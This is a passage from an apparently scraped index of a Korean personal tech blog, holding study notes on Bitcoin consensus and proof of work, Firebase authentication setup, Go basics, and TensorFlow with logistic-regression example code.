있는 identity가 없다.\nidentity가 있다면 다음과 같은 이점이 있다.\n실용성(pragmatic) : 프로토콜에서 id를 이용한 로직을 사용할 수 있다. 보안(security) : 특정 인물의 malicious한 행동을 tracking 가능하다. 그럼에도 불구하고 bitcoin에서 identity를 사용하지 않는 이유는 p2p system의 한계 때문이다.\np2p는 중앙 체제가 없기 때문에 인정받은 identity를 갖기 어렵다. bitcoin 자체가 현실의 identity를 사용하는 것을 원하지 않는다. (특정 node에서 이루어지는 transaction들은 구분할 수 있지만, 그 node가 현실의 누구 것인지는 알 수 없다.) 이러한 identity가 없는 특징 때문에 p2p network는 Sybil attack에 취약하다. Sybil attack : 한 명이 가상의 node들을 다수로 만들어 마치 여러 사람인 것 처럼 보이게 하는 것. weaker assumption node마다 identity를 부여하고, 이 부여받은 identity를 검증하는 작업은 매우 복잡하다.\nauthenticated 된 identity를 부여하는 것 대신 랜덤한 token을 node에 부여한다.\ntoken으로 특정 node를 구분할 수 있으며, 특정 사용자가 여러 node들을 만드려 할 경우 해당 node들에 동일한 token을 부여하는 방식으로 Sybil attack을 방지할 수도 있다.\nimplicit consensus : 매 round마다 random node가 선택되고, 이 node는 block chain에 들어갈 다음 block을 추천하는 방식.\n이 추천은 일방적이며, consensus 알고리즘이나 투표같은게 없다. 다른 node들은 implicitly 하게 이 block을 수락하거나 거절함으로써 malicious한 node의 행위를 막을 수 있다. implicitly 하다는 뜻은, 직접적으로 투표를 행하지는 않지만, 해당 block을 포함한 block chain을 사용하면 찬성하는 것이고, 그렇지 않다면 반대하는 것이다. block chain에서 특정 block은 마지막 block의 hash를 가지고 있기에 가능하다. bitcoin에서 사용되는 consensus algorithm을 간단하게 살펴보면 아래와 같다.\n신규 transaction은 모든 node들에 broadcast된다. 각 node들은 transaction들을 모아 block을 구성한다. 매 round마다 random node가 선출되고, 그 node에서 생성한 block을 broadcast한다. 다른 node들은 (3)에서 전송된 block을 보고, valid(unspent, valid signature) 하다면 이를 수락한다. Node들은 다음번 만드는 block에다 (3)에서 전송된 block의 hash를 집어넣음으로써 implicit하게 수락을 표현할 수 있다. (그렇지 않으면 거절을 표현한 것) 그렇다면 위 방식에 문제는 없을까?\nsignature 설정 방식이 견고하다면, transaction을 위조할 수 없기 때문에 타인의 coin을 강제로 탈취할 수 없다. 특정 node가 valid 한 데이터를 계속 deny 하더라도, 해당 node가 다음 round에서 선택되지 않으면 transaction들은 정상적으로 올라가게 된다. 약간의 번거로움만 있을 뿐 전체 시스템에 치명적인 문제가 발생하지는 않는다. node가 수행할 수 있는 악의적인 행위로는 \u0026lsquo;double spending attack\u0026rsquo; 이 있다. double spending attack\nblock chain의 block1을 base로 A가 B에게 coin을 넘겨준 transaction [b1 : A -\u0026gt; B] 이 있다고 하자 이때, A가 악의적으로 A가 자신의 또다른 계정 A\u0026rsquo;에게 coin을 넘겨주었다는 거짓 transaction [b1 : A -\u0026gt; A\u0026rsquo;] 를 추가한다면, 정상적으로 수행된 [b1 : A -\u0026gt; B] transaction과 충돌이 발생한다. 즉, merge conflict가 발생하는 2개의 branch가 생성되는 것이다. 이는 moral distinction을 요하기 때문에 기술적으로 어렵다. node들은 대체로 먼저 들어온 block을 수락하고, 더 긴 branch를 정당한 branch로 취급한다. 조작된 transaction [b1: A -\u0026gt; A\u0026rsquo;]이 든 block이 network 지연 등의 이슈로 인해 먼저 broadcast되고, 정당성을 확립하면 실제 transaction[b1 : A -\u0026gt; B] 는 orphan block이 되고, 네트워크에서 사라지게 된다. 0 confirmation transaction\ndouble spending attack을 막기 위해, block chain에 내가 coin을 지불받는 transaction이 정상적으로 들어있는 것을 확인한 후 현실 세게에서 물건을 전달하는 방식 다른 node가 올린 block에서 내 transaction이 정상적으로 적용되었는지 확인할 수 있다. 해당 block 뒤에 더 많은 block이 붙을 수록 \u0026rsquo;long term consensus chain\u0026rsquo; 이 될 확률이 높아진다. double spending attack의 성공 확률은 confirmation의 횟수만큼 exponential 하게 줄어든다. block chain의 형태가 아래와 같을 때,\r[block1] - [block2] - [block3] - [block4] - [block5]\rblock3는 3 confirmation을 받은 상태이다.\rblock4는 2 confirmation을 받은 상태이다. 일반적인 bitcoin에서는 transaction이 정상적으로 이루어진 것을 판단하기 위해서 6 confirmation을 확인한다. 이는 시간과 확률의 trade-off 관계에서 성립된 수치이다. honesty problematic 우리는 탈 중앙화를 위해 랜덤한 node에서 block을 받아 block chain에 적용하기로 했다. 하지만 모든 node가 honest 한지에 대해서는 보장할 수 없다. 각 node들은 현실 정보의 개인정보를 갖고있지 않기 때문에 block chain에 위해를 가하는(double spent 같은 공격) node를 처벌할 수 없다. 대신 올바른 block들을 만들어주는 node들에 대해 보상을 주는 방법은 가능하다. 이는 block chain으로 구성된 내용이 가치를 가지는 crypto currency 이기 때문에 가능하다. Incentive Algorithm bitcoin은 decentralize를 위해 기술적인 부분(distributed consensus)과 incentive aoglrithm 을 사용한다. block reward block chain의 규칙에 따라, block을 생성하는 node는 특수한 coin-creation transaction을 추가할 수 있다. 이를 통해 coin을 생성하고, 그것을 자신의 계좌로 연결하여 수익을 얻을 수 있다. bitcoin에서 현재(14.08) coin 생성 양은 25 코인으로 고정되어 있는데, 이는 매 4년마다 절반으로 줄어든다. 최초에는 50코인이었다. coin-creation transaction은 다른 transaction과 마찬가지로 취급된다. transaction이 consensus chain에 들어가야 효력이 발생한다. 즉, 자신의 coin-creation transaction이 든 block이 consensus chain에 포함되려면, 다른 node들이 agree 할 만한 block을 base로 하여 block을 연결하는게 유리하다. 악의적인 node가 double-spending attack을 위해 길이가 긴 block-chain을 무시하고 임의의 block을 base로 하여 자신의 block을 연결한다면, 다른 node들은 그가 만든 block-chain을 reject 할 것이고, 그가 받는 보상은 무효화 될 것이다. 이러한 방식으로 node들이 honest하게 동작하도록 유도한다. 새로운 bitcoin은 transaction시 발생하는 coin-creation transaction에 의해서만 생성되고, 현재 규칙이 계속 유지될 경우 2140에는 새로운 coin이 생성되지 않고 21 million 에서 수렴할 것이다. transaction fee transaction을 생성하는 자는(거래를 하는 자) output value를 임의로 설정할 수 있다. (단, output value \u0026lt; input value)\n해당 transactio을 최초로 block에 넣는 node는 input-output 의 차액을 가져갈 수 있다.\ntransaction fee는 자발적이고, tip과 같은 느낌이지만, block reward가 점차 감소하는 시점에서 시스템을 유지하기 위해서는 필수적인 요소가 된다.\n이러한 시스템에서도 아직 해결안된 문제는 남아있다.\n어떻게 random 한 node를 선택할 것인가 보상을 위해 과도한 경쟁(free-for-all)을 하는 현상을 어떻게 막을 것인가 Sybil attack 의 방지(2번의 심화 형태) 위 세가지 문제점은 모두 연관되어 있고, 하나의 방법으로 해결 가능하다. Proof of work 직접 random 한 node를 선택하는 대신, resource(computing power) 의 비율로 다음 node가 선택되게 하는 방법이다.\n즉, 각 node들이 각각의 computing power을 이용해 서로 경쟁하도록 하는 것이다.\n이러한 경쟁 방법을 Hash puzzle이라 부른다.\nblock을 [nonce, previous hash, {Tx1, Tx2, \u0026hellip;}] 형태로 구성하도록 한다. nonce를 포함한 전체 block을 hash 로 취했을 때, 결과값 중 target space(일반적으로 1% 이하의 매우 작은 영역)가 특정한 값이 나오도록 해야한다. (target 값보다 작은 값이 되도록) hash function이 충분히 secure 하다면, nonce를 찾으려면 random한 nonce 값을 넣으며 계산을 시도해야 하며, 일반적으로 많은 computing power가 필요할 것이다. 이를 통해 단순히 node의 숫자를 늘려서 다음 block을 선택할 기회를 얻을 확률을 높일 수 없게 되었다.\n또한 누군가가 랜덤한 block을 선출하는 것이 아닌, 경쟁과 확률을 통해 자연적으로 선출될 수 있도록 하였다.\nProof of work의 속성 Difficult to compute hash puzzle을 푸는데는 현재(14.8) 기준 block당 약 10^20 hash를 계산해야 한다. (target space의 크기가 1/10^20 이란 의미) 일반적인 PC로는 감당할 수 없고, 많은 양의 computing power을 사용하여야 하는 작업이다. 이렇게 nonce 값을 찾는 것을 흔히 bitcoin mining이라 하는 과정이다. parameterizable cost target space의 범위를 고정된 %로 취하는 것이 아닌, 가변적인 값으로 설정한다.\np2p 에 연결된 모든 node들은 자동적으로 매 2주마다 target space를 재 설정하도록 동작한다.\ntarget space의 값은 hash puzzle을 푸는데 걸리는 시간이 약 10분이 되도록 하는 것을 목표로 한다.\nblock 간의 간격이 10분이 되는 이유는, 너무 빨리 block이 갱신되면 한 block에 여러 transaction(현재기준 약 수백개)을 담아 효율적으로 운영할 수 없게 된다. latency는 기술적으로는 더 낮게 설정할 수도 있지만, 모두의 동의 하에 하한값을 설정하여 작동한다. 특정 node가 다음 block을 설정하게 될 확률은, 전체 node들의 computing power에서 그 node가 갖고 있는 computing power 의 비율에 비례한다.\n결과적으로, 다량의 computing power을 가지고 mining을 하고 있는 사람들은 대부분이 honest하고, 다음 block 선택을 경쟁적으로 수행하기 때문에 적어도 50% 이상의 확률로 block이 honest node에서 선택되었음을 보장할 수 있다.\nnonce는 확률적으로 밖에 도출될 수 없다. 이는 discrete probability process로, Bernoulii trial 이다.\nnonce를 찾는 과정은 Bernoulii trial을 연속적으로 수행하는 poisson process에 속한다. 전 network에서 누군가가 nonce를 찾는데 걸리는 시간을 확률 밀도함수(probability density)로 표현하면 exponential distribution을 이룬다. (0에 수렴하도록 감소하는 지수 함수) Trivial to verify 특정 node가 hash puzzle을 해결하여 올린 block을 다른 node에서 쉽게 검증할 수 있어야 한다. H(block) \u0026lt; target, block의 모든 값을 hash 계산한 결과가 target 보다 작은지 확인 ","permalink":"https://aswinblue.github.io/Blog/post/crypto/cryptocurrency/","summary":"Cryptocurrency Cryptographic Hash function hash function은 아래와 같은 속성을 갖는다. 모든 크기의 String을 input 으로 받는다. 정해진 크기의 output을 생성한다. (bitcoin에서는 256bit) 적당한 시간 안에 계산이 가능하다. (계산 시간이 너무 길지 않다) cryptographic hash function은 아래와 같은 security 속성을 추가로 갖는다.\ncollision-free hiding puzzle-friendly 속성1. collision-free x != y 라면, H(x) = H(y) 인 경우를 찾을 수 없어야 한다. 이 말은 collision 이 존재하지 않는다는 뜻은 아니다. num(possible_input) \u0026gt; num(possible_outputs) 이다.","title":"Cryptocurrency"},{"content":"firebase firebase는 실시간 db로 유명하며, google에 인수되고 폭이 넓어졌다. Amazon의 Amplify가 firebase와 유사하다. 일정 사용량 까지는 무료로 사용 가능하며, 이후에는 요금이 부가된다. 설치 및 사용 온라인으로 콘솔에 접속하여 프로젝트를 생성 및 설정하고, firebase sdk를 로컬에 다운받아 코드에 적용한다. firebase는 다양한 운영체제에 설치 가능하며, 각각의 설치 방법을 따르면 된다. (웹에서는 설치하지 않고 url로 참조해 사용할 수도 있다.) 버전이 올라감에 따라 참조방법, 인터페이스 등 사용법이 바뀌는 경우가 많으니 항상 docs를 잘 살펴보자\nfirebase link: https://firebase.google.com\nfirebase docs : https://firebase.google.com/docs\nfirebase를 코드에 적용하려면 config 데이터를 작성해야 한다.\nfirebase 콘솔에서 앱을 생성하고, 내 소스를 firebase의 내 프로젝트와 연동에 필요한 config 정보들을 복사하여 소스에 적용한다. ex) AppFirebase.js import firebase from \u0026#34;firebase/compat/app\u0026#34;;\rimport \u0026#34;firebase/compat/auth\u0026#34;;\rconst firebaseConfig = {\rapiKey: process.env.REACT_APP_API_KEY,\rauthDomain: process.env.REACT_APP_AUTHDOMAIN,\rprojectId: process.env.REACT_APP_PROJECTID,\rstorageBucket: process.env.REACT_APP_STORAGEBUCKET,\rmessagingSenderId: process.env.REACT_APP_MESSAGINGSENDERID,\rappId: process.env.REACT_APP_APPID\r};\rexport default firebase.initializeApp(firebaseConfig);\rexport const authService = firebase.auth(); 기능 firebase 콘솔에 로그인 하고, 프로젝트를 생성한다. 생성된 프로젝트에 진입하여 원하는 기능을 사용할 수 있다. 인증 (Auth) \u0026lsquo;Authentication\u0026rsquo; 탭을 선택하여 사용 가능하다. email, phone, google account, facebook account 등 다양한 인증 방법을 제공한다. 다만, 주의할 점은 firebase API를 이용해 인증 서비스를 이용하면, 이후 확보된 사용자층을 다른 플랫폼으로 옮길 수 없다는 점이다. 로그인에 사용된 계정들은 콘솔창에서 관리할 수 있으며, 비밀번호 재설정 등을 위한 메일도 커스텀할 수 있도록 환경이 제공된다. React code import { authService } from \u0026#34;../components/AppFirebase\u0026#34;;\rconst data = await authService.createUserWithEmailAndPassword(email, password) // email, passwd로 계정 생성\rconst data = await authService.signInWithEmailAndPassword(email, password) // email, passwd로 로그인 email 인증 Authentication 탭에서 signed-in method를 선택한다. 원하는 \u0026lsquo;로그인 제공업체\u0026rsquo; 를 선택하여 추가한다. ","permalink":"https://aswinblue.github.io/Blog/post/database/firebase/","summary":"firebase firebase는 실시간 db로 유명하며, google에 인수되고 폭이 넓어졌다. Amazon의 Amplify가 firebase와 유사하다. 일정 사용량 까지는 무료로 사용 가능하며, 이후에는 요금이 부가된다. 설치 및 사용 온라인으로 콘솔에 접속하여 프로젝트를 생성 및 설정하고, firebase sdk를 로컬에 다운받아 코드에 적용한다. firebase는 다양한 운영체제에 설치 가능하며, 각각의 설치 방법을 따르면 된다. (웹에서는 설치하지 않고 url로 참조해 사용할 수도 있다.) 버전이 올라감에 따라 참조방법, 인터페이스 등 사용법이 바뀌는 경우가 많으니 항상 docs를 잘 살펴보자","title":"Firebase"},{"content":"Go 설치 및 프로젝트 생성 구글 검색을 통해 설치파일을 다운받는다. root 디렉터리 설정이 필요하다.(\u0026lsquo;C:\\Go, \u0026lsquo;/usr/local/go/bin/\u0026rsquo;) 이후 생성할 프로젝트는 이 root 디렉터리 하위 경로에 생성된다. 외부 경로에는 프로젝트를 생성할 수 없다. root 디렉터리 안 src 디렉터리에 프로젝트를 생성한다. Go는 npm, pip 와 같이 패키지 매니저가 없다. git 등에서 코드를 받아오면 src 디렉터리 안에 도메인별로 정리해서 관리하는게 정석이다. 문법 printf format specifier %v: used as a placeholder for the default format representation of a value %+v: a detailed representation of the value, including all the fields and their corresponding values for structs and maps. ","permalink":"https://aswinblue.github.io/Blog/post/golang/golang/","summary":"Go 설치 및 프로젝트 생성 구글 검색을 통해 설치파일을 다운받는다. root 디렉터리 설정이 필요하다.(\u0026lsquo;C:\\Go, \u0026lsquo;/usr/local/go/bin/\u0026rsquo;) 이후 생성할 프로젝트는 이 root 디렉터리 하위 경로에 생성된다. 외부 경로에는 프로젝트를 생성할 수 없다. root 디렉터리 안 src 디렉터리에 프로젝트를 생성한다. Go는 npm, pip 와 같이 패키지 매니저가 없다. git 등에서 코드를 받아오면 src 디렉터리 안에 도메인별로 정리해서 관리하는게 정석이다. 문법 printf format specifier %v: used as a placeholder for the default format representation of a value %+v: a detailed representation of the value, including all the fields and their corresponding values for structs and maps.","title":"Golang"},{"content":"#Tensorflow\nTensorFlow는 구글에서 수치연산을 위해 만든 라이브러리이다. 기본 개념 node와 edge로 구성된 graph를 이용해 수치 연산을 수행한다. node들은 특정한 데이터가 들어오면 연산을 수행하거나, 형태를 변경하거나, 결과를 출력하는 역할을 한다.\nedge는 학습데이터가 저장되는 다차원 배열이다.\nedge는 node에서 계산된 데이터를 다음 node로 이동시킨다.\nedge는 방향성이 있으며(directed), tensor라 불린다.\narchive.ics.uci.edu/ml 에서 학습용 데이터를 받아 사용할 수 있다.\n설치 python과 pip를 설치한다. pip install tensorflow 명령을 수행한다. window에서 \u0026lsquo;client_load_reporting_filter.h\u0026rsquo; 파일을 찾지 못해 설치를 못했다면, path 경로가 너무 길어서 발생하는 오류이다. 실행에서 regedit을 실행하고, \u0026lsquo;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\u0026rsquo; 레지스트리를 찾아 값을 1로 세팅해준다. 연관 모듈 함께 쓰면 효율이 좋은 모듈들 matplotlib numpy data = np.loadtxt(FILE_NAME, delimiter=',') : ,를 기준으로 데이터를 나누는 csv 파일을 읽어들임. 숫자 데이터를 읽을 때 사용 keras (tensorflow 설치시 자동성치된다) y_encoded = to_categorical(y_data) : y_data 를 one-hot-encoding 하는 함수 (tensorflow.keras.utils.to_categorical) pandas df = pd.read_csv(FILE_NAME) : csv 파일을 읽어서 dataframe을 구성한다. 숫자 및 문자열 데이터를 읽을 때 사용 가능 sklearn 데이터 전처리 e = sklearn.preprocessing.LabelEncoder()\re.fit(data) # data 에 들어있는 값 중 unique한 값을 뽑아(중복 제거) 특정 string에 번호를 매기는(indexing) 함수\rdata = e.transform(data) # indexing 된 정보를 바탕으로 실제 data값을 index로 치환 기본 문법 상수 선언\nval = tf.constant(value, dtype=None, shape=None, name='Conts', verify_shape=False) value = 값 dtype : 데이터 타입, ex) \u0026rsquo;tf.float32\u0026rsquo;, \u0026rsquo;tf.float64\u0026rsquo;, \u0026rsquo;tf.int8\u0026rsquo; float(32, 64), int(8, 16, 64),uint(8, 16), string, bool, complex(64, 128 : 복소수) shape : 차원, value 형태에 따라 자동으로 설정 됨, ex) \u0026lsquo;[3,3]\u0026rsquo; name : 상수의 이름 verify_shape : tensor의 shape를 바꿀수 있는지 여부 배열 생성 arr = tf.range(5) output : tf.Tensor : shape(5,), dtype=int32, numpy=([0, 1, 2, 3, 4], dtype=int32)\n\u0026rsquo;tf.zeros([2,3])\u0026rsquo; output : [[0, 0, 0], [0, 0, 0]]\n\u0026rsquo;tf.ones([2,3])' output : [[1, 1, 1], [1, 1, 1]]\n\u0026rsquo;tf.fill([2,3], 5)' output : [[5, 5, 5], [5, 5, 5]]\n연산자 tf.add(x,y) : x + y\ntf.subtract(x,y) : x - y\ntf.multiply(x,y) : x * y\ntf.div(x,y) : x / y\ntf.floordiv(x,y) : x // y\ntf.mod(x,y) : x % y\ntf.pow(x,y) : x ** y\ntf.less(x,y) : x \u0026lt; y\ntf.less_equal(x,y) : x \u0026lt;= y\ntf.greater(x,y) : x \u0026gt; y\ntf.greater_equal(x,y) : x \u0026gt;= y\ntf.logical_and(x,y) : x \u0026amp; y\ntf.logical_or(x,y) : x | y\ntf.logical_xor(x,y) : x ^ y\ntf.maximum(x,y) : max(x,y)\ntf.reduce_sum(a) : 배열 a에서 같은 index 위치의 값을 모두 더한 스칼라 값을 반환\ntf.reduce_mean(a) : 배열 a에서 같은 index 위치의 값을 평균낸 스칼라 값을 반환 x,y가 배열인 경우, 연산자는 같은 index에 위치한 값끼리 연산한다.\nex) tf.add(x,y) = [(x[0] + y[0]), (x[1] + y[1]), (x[2] + y[2]), ...] \u0026lsquo;reduce\u0026rsquo; 가 들어간 연산은 axis 파라미터를 설정하여 어느 축을 기준으로 연산을 수행할지 설정 가능\nex) a = [[1,2,3],[4,5,6]]\rtf.reduce_sum(a, axis=0) = [5, 7, 9]\rtf.reduce_sum(a, axis=1) = [6, 15] 변수 tensorflow에서 변수는 node를 만들고, 그 안의 값을 참조하는 방식이다.\nvar = tf.Variable(value, dtype=type)\nvalue : 변수에 담을 값 dtype : 변수 타입 2.x 버전에서는 위와같이 선언과 동시에 초기화가 가능하다. node를 생성하고 var은 그 node의 주소를 가리킨다.\nvar.assign(value)\nvar이 가리키는 node에 value 값을 적용\nvar.assign_add(value)\nvar이 가리키는 node에 value 값을 더함\nvar.assign_add(value)\nvar이 가리키는 node에 value 값을 뺌\ntf.cast()\n변수를 특정 값, 특정 형태로 치환해주는 함수\n출력\nval.numpy() : \u0026lsquo;val\u0026rsquo; tensor를 numpy 배열 형태로 출력\n비교 tf.equal() : tensorflow 변수를 비교하는 함수\n랜덤 tf.random.set_seed() : 정수를 이용해 랜덤값 시드 설정 tf.random.normal([2, 1], mean=0.0)) : 정규분포에 기반한 랜덤값, 인자로 행렬 shape와 평균이 들어간다.\n심화 내용 tensorflow와 행렬 TensorFlow에서 배열은 행렬로 표현되며, 행렬은 shape라 불린다. 행렬 계산을 위한 함수를 제공한다. tf.matmul(a, b) : 행렬의 내적(곱) tf.linalg.inv(a) : 역행렬 Broadcasting 행렬을 곱셈 혹은 덧셈을 하기 위해서는 shape에 대한 제약조건이 있고, tensorflow에서도 마찬가지다. tensorflow에서는 행렬 연산에서 차원(shape)이 맞지 않을 때 행렬을 자동으로 늘려서(Stretch) 차원을 맞춰주는 Broadcasting기능이 있다. 연산시 shape는 첫번째 피연산자를 기준으로 한다. stretch 시 새로 생성된 공간에는 기존 내용을 복사하여 채워넣는다. 단, 늘릴 수는 있지만, 줄일수는 없다. ex) a[4,3] + b[1,3] : 가능 a[4,3] + b[1,5] : 불가능 (3 \u0026lt; 5 이므로, 5를 3으로 바꾸려면 축소해야함) a[4,1] + b[1,3] : 가능 tensorflow 함수 tensorflow 1.x 버전은 placeholder를 통해 입력을 받는 객체를 생성하고, 실행시 session을 통해 feed 값을 전달한다. 즉 명시적으로 입력 형태를 구성해야 했다. tensorflow는 2.x 버전부터 python 프로그램처럼 라이브러리를 사용할 수 있도록 연산에 함수를 제공하고 있다. 함수를 사용하면 placeholder를 생략하고 사용할 수 있다. tensorflow 함수는 파이썬 함수처럼 정의하여 사용 가능하며, 컴파일시 속도 향상을 원한다면 @tf.function 데코레이터를 적용하면 된다.\nex) @tf.function\rdef t_func(a,b):\rreturn tf.matmul(a,b)\rx = [[4,5,6],[6,7,8]] # tensorflow 변수가 아님\rw = tf.Variable([2,5],[6,5],[17,10])\rprint(t_func(x,w))\r# tensorflow 2.x 이후부터는 변수 x같은 값들도\r# placeholder를 만들고 feed 값을 주는 복잡한 과정 없이\r# tensorflow 함수를 이용해 연산 가능해졌다. tensorflow 미분 gradient 계산에 미분이 많이 사용고, tensorflow는 미분 함수를 제공한다. tape.gradient(y,x) : 텐서 x에 대한 y의 미분값 tape.watch() : 상수형 텐서를 변수형 텐서로 변환 ex)\nx1 = tf.Variable(tf.constant(1.0)) # 변수 선언\rx2 = tf.Variable(tf.constant(2.0)) # 변수 선언\rwith tf.GradientTape() as tape: # 미분을 위해 GradientTape 객체 생성\ry = tf.multiply(x1, x2) # 미분할 함수값을 GradientTape 객체 안에서 정의\rgradients = tape.gradient(y, [x1, x2]) # x1 미분값과 x2 미분값을 각각 반환\r# y = x1 * x2\r# x1 에 대한 미분값 : 2.0\r# x2 에 대한 미분값 : 1.0\r# gradients = [2.0, 1.0]\ra = tf.constant(2.0)\rgradients2 = tape.gradient(y,a)\r# 상수로 미분하면 None 값이 된다.\r# gradients2 = None\r# 상수를 변수로 변환시켜 미분시킬 수 있다.\rwith tf.GradientTape() as tape:\rtape.watch(a)\ry = tf.multiply(x1, a)\rgradients3 = tape.gradient(y,a)\r# gradients3 = 1.0 선형 회귀 \u0026lsquo;딥러닝\u0026rsquo;은 데이터를 통해 관계를 학습하고, 학습된 모델을 통해 데이터가 주어지면 예측값을 도출해 내는 기술이다. \u0026lsquo;딥러닝\u0026rsquo;의 가장 기본적인 계산 원리는 \u0026lsquo;션형 회귀\u0026rsquo;와 \u0026lsquo;로지스틱 회귀\u0026rsquo; 이다. 선형회귀 : 데이터 분포를 통해 데이터들과 가장 근접한 선을 도출해내는 계산법 로지스틱 회귀 : 0과 1 둘 중 하나를 선택하는 계산법 판단의 근거를 마련할 때 사용 sigmoid 함수를 사용하여 확률값으로 사용 선형 회귀 정의 종속변수 y와 한개 이상의 독립변수 x와의 선형 상관관계를 모델링하는 회귀분석 기법\n단순 선형회귀 : 하나의 변수에 기반하여 동작 다중 선형 회귀 : 둘 이상의 변수에 기반하여 동작 선형 예측함수를 통해 회귀식을 모델링하고, 알려지지 않은 파라미터를 데이터로 추정\n회귀식을 선형 모델이라고 한다.\n값을 예측하기 위해 학습 데이터로 적합한 예측 모형을 개발한다.\n종속변수 y와 이에 연관된 독립변수들 x1, x2\u0026hellip; 에 대해 x와 y간의 관계를 정량화 할 수 있다.\n일반적으로 최소제곱을 사용해 선형 회귀 모델을 구할 수 있다. (y = ax + b 형태)\n독립변수(x)가 증가하면 최소 제곱법으로 처리가 불가능하다. 딥러닝에서는 y = wx + b 형태로 표현하는데, w 는 weight, b는 bias 를 뜻한다.\nweight : 가중치, 입력값 x의 영향도를 표현하는 상수 bias : 기준점, 판단의 근거가 되는 식의 기준점을 표현하는 상수 오차방정식 선형 회귀에서 입력값이 여러개일 경우, 첫번째 입력으로 임의의 선을 그린다.\n정답과 임의의 선이 맞는지 확인하고 평가한다 (오차 확인)\n확인된 오차 값을 이용해 임의의 선을 수정한다.\n즉, y = ax + b 에서 (x,y)를 입력으로 받고 a,b를 추론한다. 이러한 계산 식을 오차방정식이라 한다.\n오차의 합 = ∑ (예측값 - 정답)²\nMSE : Mean Squared Error, 평균제곱오차 = (오차의 합) / n\nRMSE : Root Mean Squared Error, 평균 제곱근 오차 = root(편균제곱오차)\n경사 하강법 대표적인 \u0026lsquo;최적화 알고리즘\u0026rsquo;으로, 비용 함수를 최소화하기 위해 반복해서 파라미터를 조정해나가는 방식이다.\ny = a*x 방정식에서 x = [1,2,3] y = [1,2,3] 이라고 한다면 a값은 1이다. 이때 MSE 오차식과 x에 대해 그래프를 그리면 2차원 그래프가 나오게 된다. 이때 기울기가 0인 부분, 즉 꼭짓점의 x 값이 정답이 된다.\n이러한 특성을 이용하여 다음과 같이 정답을 찾는 recursive한 전략을 취할 수 있다.\n임의의 값 x1에서 미분을 구한다. 구해진 기울기의 반대 방향으로 이동하여 그래프와 겹쳐지는 부분의 x좌표를 x2라 한다. 1~2 과정을 반복하면 점차 기울기가 줄어들고, 이를 충분히 수행하면 정답값에 수렴한다. 하지만 오차 그래프의 폭이 좁은 경우, 위 방식을 수행하면 특정 값으로 수렴하지 않고 결과값이 발산한다.\n이를 막기 위해 기울기를 100% 취하지 않고, \u0026lsquo;학습률\u0026rsquo; 이라는 상수를 곱해 일정 양만큼만 전략에 반영될 수 있게 한다.\n학습률은 정해진 값이 아니고, 데이터에 따라 적합한 값이 달라지는 상수이다.\n위 전략을 수정하여 다시 적용하면\n임의의 값 x1에서 미분을 구하고, 학습률을 적용하여 값을 조정한다. 구해진 값을 기울기로하여 이동할 때 그래프와 겹쳐지는 부분의 x좌표를 x2라 한다. 1~2 과정을 반복하면 점차 기울기가 줄어들고, 이를 충분히 수행하면 정답값에 수렴한다. learning_rate = 0.1\rwith tf.GradleTape() as tape:\rhypothesis = W * x_data\rcost = tf.reduce_mean(tf.square) 로지스틱 회귀 선형회귀와 함께 대표적인 딥러닝 알고리즘이다.\n독립변수의 선형 결합을 이용하여 사건 발생의 가능성을 예측하는데 사용되는 \u0026lsquo;통계 기법\u0026rsquo; 이다. (확률 계산)\n로지스틱 회귀는 종속변수와 독립변수 간의 관계를 함수로 나타내어 향후 예측모델에서 사용하므로, 독립변수의 선형 결합으 종속변수를 설명한다는 관점에서 선형 회귀분석과 유사하다.\n하지만, 로지스틱 회귀는 데이터의 결과가 특정 분류로 나뉘어 지기 때문에 classification 기법으로 볼 수 있다.\n이진 분류 문제, 즉 0과 1 중 하나를 판별하는 문제는 로지스틱 회귀를 이용하여 풀 수 있다.\nstep function 혹은 sigmoid를 사용하는데, 보통 0과 1 사이의 확률값을 표현할 수 있는 sigmoid를 사용한다.\n시그모이드 시그모이드 방정식은 아래와 같다.\ny = 1 / (1 + e \u0026lt;sup\u0026gt;-x\u0026lt;/sup\u0026gt;)\ne는 자연상수이며, 자연상수를 사용하였기 때문에 확률값으로 사용 가능하다.\nsigmoid 함수에 선형 회귀 함수를 대입하면 아래와 같이 된다.\ny = 1 / (1 + e \u0026lt;sup\u0026gt;(-wx+b)\u0026lt;/sup\u0026gt;)\n이 함수에 경사하강법을 이용하여 w와 b를 찾아낼 수 있다.\nw값이 증가하면 sigmoid 함수는 step function에 유사하게 경사가 가팔라 진다.\nb값이 증가하면 그래프가 우측 방향으로 이동한다.\n오차함수 로지스틱 회귀는 target이 0 또는 1 두가지라는 점에서 선형 회귀와 다르다.\n때문에 로지스틱 회귀는 오차함수도 두가지가 있다.\n정답이 0일 경우 -log(l-h) 그래프 형태이다. 정답이 1일 경우 -log(h) 그래프 형태이다. 정답값 0 혹은 1을 대입하면 원하는 오차함수가 나오는 식을 binary cross entropy 라 하고, 그 식은 다음과 같다.\nY = -(Y * LOG(H) + (1-Y)*LOG(1-H))\n로지스틱 회귀법을 tensorflow 함수로 구현하면 아래와 같다.\n# 6 by 2 형태의 x 데이터 학습값\rx_train = np.array([[1., 1.],\r[1., 2.],\r[2., 1.],\r[3., 2.],\r[3., 3.],\r[2., 3.]],\rdtype=np.float32)\r# 6 by 1 형태의 y 데이터 학습값\ry_train = np.array([[0.],\r[0.],\r[0.],\r[1.],\r[1.],\r[1.]],\rdtype=np.float32)\r# 이 학습값을 이용해 W와 b를 찾아본다.\r# 랜덤값을 위한 설정\rtf.random.set_seed(12345)\r# W와 b의 초기값을 랜덤하게 설정, x값이 [6, 2] 이므로 W 형태를 [2, 1] 로 해야 y 값인 [6, 1] 에 맞게 matmul이 가능하다.\rW = tf.Variable(tf.random.normal([2, 1], mean=0.0))\rb = tf.Variable(tf.random.normal([1], mean=0.0))\rprint(\u0026#39;weights: \\n\u0026#39;, W.numpy(), \u0026#39;\\n\\nbias: \\n\u0026#39;, b.numpy())\r# x값을 sigmoid 함수에 대입하여 y값을 반환하는 함수\r# x값의 shape가 [,2] 형태이므로 z = -(w1*x1 + w2*x2 + b) 가 된다.\rdef predict(X):\rz = tf.matmul(X, W) + b\rhypothesis = 1 / (1 + tf.exp(-z))\rreturn hypothesis\r# 반복 학습\rfor i in range(2001):\rwith tf.GradientTape() as tape:\rhypothesis = predict(x_train)\r# cost : binary cross entropy 식으로 loss 값을 계산\rcost = tf.reduce_mean(-tf.reduce_sum(y_train*tf.math.log(hypothesis) + (1-y_train)*tf.math.log(1-hypothesis)))\r# w와 b로 편미분하여 오차값 계산\rW_grad, b_grad = tape.gradient(cost, [W, b])\r# 오차값에 learning rate를 적용한 결과값으로 w와 b를 재설정\rW.assign_sub(learning_rate * W_grad)\rb.assign_sub(learning_rate * 